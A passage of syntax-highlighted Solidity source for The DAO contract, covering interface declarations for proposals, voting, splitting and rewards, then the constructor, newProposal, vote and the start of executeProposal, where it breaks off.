    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> `msg.sender` creates a proposal to send `_amount` Wei to</span>
    <span class="c1">/// `_recipient` with the transaction data `_transactionData`. If</span>
    <span class="c1">/// `_newCurator` is true, then this is a proposal that splits the</span>
    <span class="c1">/// DAO and sets `_recipient` as the new DAO&#39;s Curator.</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _recipient Address of the recipient of the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount Amount of wei to be sent with the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _description String describing the proposal</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _transactionData Data of the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _debatingPeriod Time used for debating a proposal, at least 2</span>
    <span class="c1">/// weeks for a regular proposal, 10 days for new Curator proposal</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _newCurator Bool defining whether this proposal is about</span>
    <span class="c1">/// a new Curator or not</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> The proposal ID. Needed for voting on the proposal</span>
    <span class="kd">function</span> <span class="n">newProposal</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_amount</span><span class="p">,</span>
        <span class="kt">string</span> <span class="n">_description</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_debatingPeriod</span><span class="p">,</span>
        <span class="kt">bool</span> <span class="n">_newCurator</span>
    <span class="p">)</span> <span class="n">onlyTokenholders</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Check that the proposal with the ID `_proposalID` matches the</span>
    <span class="c1">/// transaction which sends `_amount` with data `_transactionData`</span>
    <span class="c1">/// to `_recipient`</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalID The proposal ID</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _recipient The recipient of the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of wei to be sent in the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _transactionData The data of the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the proposal ID matches the transaction data or not</span>
    <span class="kd">function</span> <span class="n">checkProposalCode</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_amount</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span>
    <span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_codeChecksOut</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Vote on proposal `_proposalID` with `_supportsProposal`</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalID The proposal ID</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _supportsProposal Yes/No - support of the proposal</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> The vote ID.</span>
    <span class="kd">function</span> <span class="n">vote</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">bool</span> <span class="n">_supportsProposal</span>
    <span class="p">)</span> <span class="n">onlyTokenholders</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_voteID</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Checks whether proposal `_proposalID` with transaction data</span>
    <span class="c1">/// `_transactionData` has been voted for or rejected, and executes the</span>
    <span class="c1">/// transaction in the case it has been voted for.</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalID The proposal ID</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _transactionData The data of the proposed transaction</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the proposed transaction has been executed or not</span>
    <span class="kd">function</span> <span class="n">executeProposal</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span>
    <span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> ATTENTION! I confirm to move my remaining ether to a new DAO</span>
    <span class="c1">/// with `_newCurator` as the new Curator, as has been</span>
    <span class="c1">/// proposed in proposal `_proposalID`. This will burn my tokens. This can</span>
    <span class="c1">/// not be undone and will split the DAO into two DAO&#39;s, with two</span>
    <span class="c1">/// different underlying tokens.</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalID The proposal ID</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _newCurator The new Curator of the new DAO</span>
    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> This function, when called for the first time for this proposal,</span>
    <span class="c1">/// will create a new DAO and send the sender&#39;s portion of the remaining</span>
    <span class="c1">/// ether and Reward Tokens to the new DAO. It will also burn the DAO Tokens</span>
    <span class="c1">/// of the sender.</span>
    <span class="kd">function</span> <span class="n">splitDAO</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_newCurator</span>
    <span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> can only be called by the DAO itself through a proposal</span>
    <span class="c1">/// updates the contract of the DAO by sending all ether and rewardTokens</span>
    <span class="c1">/// to the new DAO. The new DAO needs to be approved by the Curator</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _newContract the address of the new contract</span>
    <span class="kd">function</span> <span class="n">newContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newContract</span><span class="p">);</span>


    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Add a new possible recipient `_recipient` to the whitelist so</span>
    <span class="c1">/// that the DAO can send transactions to them (using proposals)</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _recipient New recipient address</span>
    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> Can only be called by the current Curator</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether successful or not</span>
    <span class="kd">function</span> <span class="n">changeAllowedRecipients</span><span class="p">(</span><span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_allowed</span><span class="p">)</span> <span class="kr">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>


    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Change the minimum deposit required to submit a proposal</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalDeposit The new proposal deposit</span>
    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> Can only be called by this DAO (through proposals with the</span>
    <span class="c1">/// recipient being this DAO itself)</span>
    <span class="kd">function</span> <span class="n">changeProposalDeposit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalDeposit</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Move rewards from the DAORewards managed account</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _toMembers If true rewards are moved to the actual reward account</span>
    <span class="c1">///                   for the DAO. If not then it&#39;s moved to the DAO itself</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the call was successful</span>
    <span class="kd">function</span> <span class="n">retrieveDAOReward</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_toMembers</span><span class="p">)</span> <span class="kr">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Get my portion of the reward that was sent to `rewardAccount`</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the call was successful</span>
    <span class="kd">function</span> <span class="n">getMyReward</span><span class="p">()</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Withdraw `_account`&#39;s portion of the reward from `rewardAccount`</span>
    <span class="c1">/// to `_account`&#39;s balance</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the call was successful</span>
    <span class="kd">function</span> <span class="n">withdrawRewardFor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Send `_amount` tokens to `_to` from `msg.sender`. Prior to this</span>
    <span class="c1">/// getMyReward() is called.</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _to The address of the recipient</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of tokens to be transfered</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the transfer was successful or not</span>
    <span class="kd">function</span> <span class="n">transferWithoutReward</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Send `_amount` tokens to `_to` from `_from` on the condition it</span>
    <span class="c1">/// is approved by `_from`. Prior to this getMyReward() is called.</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _from The address of the sender</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _to The address of the recipient</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of tokens to be transfered</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the transfer was successful or not</span>
    <span class="kd">function</span> <span class="n">transferFromWithoutReward</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span>
        <span class="kt">uint256</span> <span class="n">_amount</span>
    <span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Doubles the &#39;minQuorumDivisor&#39; in the case quorum has not been</span>
    <span class="c1">/// achieved in 52 weeks</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the change was successful or not</span>
    <span class="kd">function</span> <span class="n">halveMinQuorum</span><span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> total number of proposals ever created</span>
    <span class="kd">function</span> <span class="n">numberOfProposals</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_numberOfProposals</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalID Id of the new curator proposal</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Address of the new DAO</span>
    <span class="kd">function</span> <span class="n">getNewDAOAddress</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">_newDAO</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _account The address of the account which is checked.</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the account is blocked (not allowed to transfer tokens) or not.</span>
    <span class="kd">function</span> <span class="n">isBlocked</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> If the caller is blocked by a proposal whose voting deadline</span>
    <span class="c1">/// has exprired then unblock him.</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the account is blocked (not allowed to transfer tokens) or not.</span>
    <span class="kd">function</span> <span class="n">unblockMe</span><span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

    <span class="kd">event</span> <span class="n">ProposalAdded</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="kr">indexed</span> <span class="n">proposalID</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">recipient</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">amount</span><span class="p">,</span>
        <span class="kt">bool</span> <span class="n">newCurator</span><span class="p">,</span>
        <span class="kt">string</span> <span class="n">description</span>
    <span class="p">);</span>
    <span class="kd">event</span> <span class="n">Voted</span><span class="p">(</span><span class="kt">uint</span> <span class="kr">indexed</span> <span class="n">proposalID</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">position</span><span class="p">,</span> <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">voter</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">ProposalTallied</span><span class="p">(</span><span class="kt">uint</span> <span class="kr">indexed</span> <span class="n">proposalID</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">result</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">quorum</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">NewCurator</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_newCurator</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">AllowedRecipientChanged</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_allowed</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// The DAO contract itself</span>
<span class="kd">contract</span> <span class="n">DAO</span> <span class="kr">is</span> <span class="n">DAOInterface</span><span class="p">,</span> <span class="n">Token</span><span class="p">,</span> <span class="n">TokenCreation</span> <span class="p">{</span>

    <span class="c1">// Modifier that allows only shareholders to vote and create new proposals</span>
    <span class="kd">modifier</span> <span class="n">onlyTokenholders</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>
            <span class="kr">_</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">DAO</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_curator</span><span class="p">,</span>
        <span class="n">DAO_Creator</span> <span class="n">_daoCreator</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_proposalDeposit</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_minTokensToCreate</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_closingTime</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_privateCreation</span>
    <span class="p">)</span> <span class="n">TokenCreation</span><span class="p">(</span><span class="n">_minTokensToCreate</span><span class="p">,</span> <span class="n">_closingTime</span><span class="p">,</span> <span class="n">_privateCreation</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">curator</span> <span class="o">=</span> <span class="n">_curator</span><span class="p">;</span>
        <span class="n">daoCreator</span> <span class="o">=</span> <span class="n">_daoCreator</span><span class="p">;</span>
        <span class="n">proposalDeposit</span> <span class="o">=</span> <span class="n">_proposalDeposit</span><span class="p">;</span>
        <span class="n">rewardAccount</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ManagedAccount</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
        <span class="n">DAOrewardAccount</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ManagedAccount</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">rewardAccount</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">DAOrewardAccount</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">lastTimeMinQuorumMet</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
        <span class="n">minQuorumDivisor</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="c1">// sets the minimal quorum to 20%</span>
        <span class="n">proposals</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// avoids a proposal with ID 0 because it is used</span>

        <span class="n">allowedRecipients</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="n">allowedRecipients</span><span class="p">[</span><span class="n">curator</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&lt;</span> <span class="n">closingTime</span> <span class="o">+</span> <span class="n">creationGracePeriod</span> <span class="o">&amp;&amp;</span> <span class="nb">msg.sender</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">extraBalance</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">createTokenProxy</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="n">receiveEther</span><span class="p">();</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">receiveEther</span><span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">newProposal</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_amount</span><span class="p">,</span>
        <span class="kt">string</span> <span class="n">_description</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_debatingPeriod</span><span class="p">,</span>
        <span class="kt">bool</span> <span class="n">_newCurator</span>
    <span class="p">)</span> <span class="n">onlyTokenholders</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">)</span> <span class="p">{</span>

        <span class="c1">// Sanity check</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_newCurator</span> <span class="o">&amp;&amp;</span> <span class="p">(</span>
            <span class="n">_amount</span> <span class="o">!=</span> <span class="mi">0</span>
            <span class="o">||</span> <span class="n">_transactionData</span><span class="p">.</span><span class="n">length</span> <span class="o">!=</span> <span class="mi">0</span>
            <span class="o">||</span> <span class="n">_recipient</span> <span class="o">==</span> <span class="n">curator</span>
            <span class="o">||</span> <span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span>
            <span class="o">||</span> <span class="n">_debatingPeriod</span> <span class="o">&lt;</span> <span class="n">minSplitDebatePeriod</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span>
            <span class="o">!</span><span class="n">_newCurator</span>
            <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="n">isRecipientAllowed</span><span class="p">(</span><span class="n">_recipient</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">_debatingPeriod</span> <span class="o">&lt;</span>  <span class="n">minProposalDebatePeriod</span><span class="p">))</span>
        <span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">_debatingPeriod</span> <span class="o">&gt;</span> <span class="mi">8</span> <span class="kc">weeks</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isFueled</span>
            <span class="o">||</span> <span class="nb">now</span> <span class="o">&lt;</span> <span class="n">closingTime</span>
            <span class="o">||</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&lt;</span> <span class="n">proposalDeposit</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">_newCurator</span><span class="p">))</span> <span class="p">{</span>

            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">+</span> <span class="n">_debatingPeriod</span> <span class="o">&lt;</span> <span class="nb">now</span><span class="p">)</span> <span class="c1">// prevents overflow</span>
            <span class="k">throw</span><span class="p">;</span>

        <span class="c1">// to prevent a 51% attacker to convert the ether into deposit</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
            <span class="k">throw</span><span class="p">;</span>

        <span class="n">_proposalID</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">.</span><span class="n">length</span><span class="o">++</span><span class="p">;</span>
        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>
        <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">=</span> <span class="n">_recipient</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">amount</span> <span class="o">=</span> <span class="n">_amount</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">description</span> <span class="o">=</span> <span class="n">_description</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">proposalHash</span> <span class="o">=</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">_recipient</span><span class="p">,</span> <span class="n">_amount</span><span class="p">,</span> <span class="n">_transactionData</span><span class="p">);</span>
        <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span> <span class="o">=</span> <span class="nb">now</span> <span class="o">+</span> <span class="n">_debatingPeriod</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="c1">//p.proposalPassed = False; // that&#39;s default</span>
        <span class="n">p</span><span class="p">.</span><span class="n">newCurator</span> <span class="o">=</span> <span class="n">_newCurator</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_newCurator</span><span class="p">)</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">.</span><span class="n">length</span><span class="o">++</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">creator</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">proposalDeposit</span> <span class="o">=</span> <span class="nb">msg.value</span><span class="p">;</span>

        <span class="n">sumOfProposalDeposits</span> <span class="o">+=</span> <span class="nb">msg.value</span><span class="p">;</span>

        <span class="n">ProposalAdded</span><span class="p">(</span>
            <span class="n">_proposalID</span><span class="p">,</span>
            <span class="n">_recipient</span><span class="p">,</span>
            <span class="n">_amount</span><span class="p">,</span>
            <span class="n">_newCurator</span><span class="p">,</span>
            <span class="n">_description</span>
        <span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">checkProposalCode</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_amount</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span>
    <span class="p">)</span> <span class="n">noEther</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_codeChecksOut</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>
        <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">proposalHash</span> <span class="o">==</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">_recipient</span><span class="p">,</span> <span class="n">_amount</span><span class="p">,</span> <span class="n">_transactionData</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">vote</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">bool</span> <span class="n">_supportsProposal</span>
    <span class="p">)</span> <span class="n">onlyTokenholders</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">_voteID</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">votedYes</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span>
            <span class="o">||</span> <span class="n">p</span><span class="p">.</span><span class="n">votedNo</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span>
            <span class="o">||</span> <span class="nb">now</span> <span class="o">&gt;=</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span><span class="p">)</span> <span class="p">{</span>

            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">_supportsProposal</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">p</span><span class="p">.</span><span class="n">yea</span> <span class="o">+=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
            <span class="n">p</span><span class="p">.</span><span class="n">votedYes</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">p</span><span class="p">.</span><span class="n">nay</span> <span class="o">+=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
            <span class="n">p</span><span class="p">.</span><span class="n">votedNo</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">_proposalID</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span> <span class="o">&gt;</span> <span class="n">proposals</span><span class="p">[</span><span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]].</span><span class="n">votingDeadline</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// this proposal&#39;s voting deadline is further into the future than</span>
            <span class="c1">// the proposal that blocks the sender so make it the blocker</span>
            <span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">_proposalID</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">Voted</span><span class="p">(</span><span class="n">_proposalID</span><span class="p">,</span> <span class="n">_supportsProposal</span><span class="p">,</span> <span class="nb">msg.sender</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">executeProposal</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">bytes</span> <span class="n">_transactionData</span>
    <span class="p">)</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>

        <span class="kt">uint</span> <span class="n">waitPeriod</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">newCurator</span>
            <span class="o">?</span> <span class="n">splitExecutionPeriod</span>
            <span class="o">:</span> <span class="n">executeProposalPeriod</span><span class="p">;</span>
        <span class="c1">// If we are over deadline and waiting period, assert proposal is closed</span>
